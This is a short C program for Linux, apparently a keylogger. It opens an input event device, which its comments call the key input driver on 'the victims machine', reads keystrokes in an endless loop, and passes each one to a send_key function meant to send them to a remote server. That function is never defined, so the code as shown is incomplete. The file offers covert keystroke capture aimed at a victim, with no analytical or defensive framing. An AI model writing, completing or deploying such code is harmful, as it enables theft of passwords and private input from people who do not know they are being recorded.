#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>

#define EVENT_FILE "/dev/input/event3"

int main() {
    int fd;
    struct input_event ev;

    //open the key input driver on the victims machine
    fd = open(EVENT_FILE, O_RDONLY);
    if (fd < 0) {
        perror("Error opening event file");
        return EXIT_FAILURE;
    }

    //read key events from input driver
    while (1) {
        ssize_t bytes = read(fd, &ev, sizeof(struct input_event));
        if (bytes < (ssize_t)sizeof(struct input_event)) {
            perror("Error reading event");
            close(fd);
            return EXIT_FAILURE;
        }

        //send the key input to the remote server
        send_key(ev);
    }

    close(fd);
    return EXIT_SUCCESS;
}
